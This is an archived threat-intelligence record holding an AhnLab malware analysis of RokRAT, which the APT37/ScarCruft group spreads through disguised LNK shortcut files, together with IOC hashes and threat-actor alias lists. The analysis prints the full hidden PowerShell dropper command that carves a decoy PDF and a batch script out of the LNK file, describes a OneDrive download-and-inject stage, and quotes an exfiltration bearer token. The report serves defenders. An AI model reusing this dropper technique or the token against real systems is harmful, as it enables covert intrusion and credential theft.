{
    "id": "8c813e7b-dfae-4b55-8df5-0e7c62264151",
    "created_at": "2023-05-06T02:08:32.335714Z",
    "updated_at": "2025-03-27T02:16:37.138303Z",
    "deleted_at": null,
    "sha1_hash": "7560b63abac99a9c28a46a93a605ed39183ecca0",
    "title": "2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft)",
    "authors": "",
    "file_creation_date": "2023-05-05T02:06:32Z",
    "file_modification_date": "2023-05-05T02:06:32Z",
    "file_size": 2788928,
    "plain_text": "# RokRAT Malware Distributed Through LNK Files (*.lnk): RedEyes (ScarCruft)\n\n**asec.ahnlab.com/en/51751/**\n\nBy bghjmun April 26, 2023\n\nAhnLab Security Emergency response Center (ASEC) confirmed that the RedEyes threat group (also known as APT37, ScarCruft), which\n[distributed CHM Malware Disguised as Security Email from a Korean Financial Company last month, has also recently distributed the RokRAT](https://asec.ahnlab.com/en/49089/)\nmalware through LNK files.\n\nRokRAT is malware that is capable of collecting user credentials and downloading additional malware. The malware was once distributed\nthrough HWP and Word files. The LNK files that were discovered this time contain PowerShell commands that can perform malicious behavior\nby creating and executing a script file along with a normal file in the temp folder. The confirmed LNK filenames are as follows:\n\n230407Infosheet.lnk\nApril 29th 2023 Seminar.lnk\n2023 Personal Evaluation.hwp.lnk\nNK Diplomat Dispatch Selection and Diplomatic Offices.lnk\nNK Diplomacy Policy Decision Process.lnk\n\nThe “230407Infosheet.lnk” file is disguised with a PDF icon and contains a malicious PowerShell command.\n\n\n-----\n\nFigure 1. Properties of the LNK file\n\nThe LNK file contains not only a PowerShell command, but also the data of a normal PDF file along with malicious script codes. Furthermore,\nthere are dummy bytes that start from 0x89D9A all the way to 0x141702A.\n\nFigure 2. Dummy\n\ndata that exists at the end of the LNK file\n\nThe PowerShell command that is executed through cmd.exe upon executing the LNK file is as follows:\n\n/c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match ‘System32’ -or $dirPath -Match ‘Program Files’) {\n$dirPath = ‘%temp%’      }; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x00014A0DC4} ^|\nSelect-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00561396 -ReadCount 00561396; $pdfPath =\n‘%temp%\\230407정보지.pdf’; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002474)) -Encoding Byte; ^& $pdfPath; $exeFile = gc $lnkpath Encoding Byte -TotalCount 00564634 -ReadCount 00564634; $exePath = ‘%temp%\\230412.bat’; sc $exePath ([byte[]]($exeFile ^| select Skip 00561396)) -Encoding Byte; ^& $exePath;\n\nThe LNK file is read up to 0x890F4 and is saved and executed with the filename “230407Infosheet.pdf” in the Temp folder while excluding the\nfirst 0x9AA. Afterward, it reads up to 0x89D9A of the LNK file and is saved and executed in the Temp folder with the filename “230412.bat”\nafter excluding 0x890F4, which is the byte where the PDF data exists.\n\n\n-----\n\nlocated at 0x9AA of the LNK file\n\nlocated at 0x890F4 of the LNK file\n\nin the Temp folder\n\n\nFigure 3. PDF data\n\nFigure 4. Script code\n\nFigure 5. Files created\n\n\nThe threat actor executes a normal PDF file to make the behavior appear normal before carrying out their malicious behavior through the script\nfile.\n\n\n-----\n\nFigure 6.\n\n230407Infosheet.pdf (normal file)\n\nThe script file executed at the same time contains the following PowerShell command that executes malicious commands which exist as HEX\nvalues.\n\nFigure 7. 230412.bat\n\nThe final PowerShell command that is executed downloads the encoded data from\nhxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZElLSjE/roo\ndecodes it, and injects it into the PowerShell process to perform malicious behavior.\n\n\n-----\n\nPowerShell command that is executed\n\nfile uploaded to OneDrive\n\n\nFigure 8. Final\n\nFigure 9. Malicious\n\n\nThe injected data is the RokRAT malware that is capable of collecting user credentials and downloading additional malware. The collected\ninformation is sent to the threat actor’s cloud server using cloud services such as pcloud and yandex. The UserAgent in the request header is\ndisguised as Googlebot. The certificate token used to send files is as follows:\n\nAuthorization: Bearer RSbj7Zk5IYK5ThSbQZH4YBo7ZxiPOCH94RBbFuU9c04XXVJg7xbvX\n\nThe additional normal files executed through the malicious LNK are as follows:\n\n\n-----\n\n29th 2023 Seminar.pdf created through April 29th 2023 Seminar.lnk\n\n230402.hwp created through NK Diplomacy Policy Decision Process.lnk\n\n\nFigure 10. April\n\nFigure 11.\n\n\nAs RokRAT has been in distribution for a while and is being distributed in various forms such as Word files, users are advised to take extra\ncaution.\n\n[Reddoor (RokRAT) Malware Analysis Report – May 9, 2022](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=4b8712d0-31e8-46c1-b6d7-0e1b32f94b60)\n[Korean APT Attacks Using Ruby Script Analysis Report – Apr. 7, 2021](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=255948d4-3b27-4227-ae9a-542aa2eea545)\n\n\n-----\n\n[ e etect o ]\nDropper/LNK.Agent (2023.04.08.00)\n\nDownloader/BAT.Agent (2023.04.08.00)\n\n[IOC]\n\n0f5eeb23d701a2b342fc15aa90d97ae0 (LNK)\n\naa8ba9a029fa98b868be66b7d46e927b (LNK)\n\n657fd7317ccde5a0e0c182a626951a9f (LNK)\n\nbe32725e676d49eaa11ff51c61f18907 (LNK)\n\n8fef5eb77e0a9ef2f97591d4d150a363 (bat)\n\n461ce7d6c6062d1ae33895d1f44d98fb (bat)\n\nhxxps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZElLSjE/root/\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis**\n**information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information-en/)\n\n[Tagged as:APT37,lnk,RedEyes,RokRAT,ScarCruft](https://asec.ahnlab.com/en/tag/apt37-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft).pdf"
    ],
    "report_names": [
        "2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft).pdf"
    ],
    "threat_actors": [
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338912,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1683252392,
    "ts_modification_date": 1683252392,
    "files": {
        "pdf": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.pdf",
        "text": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.txt",
        "img": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.jpg"
    }
}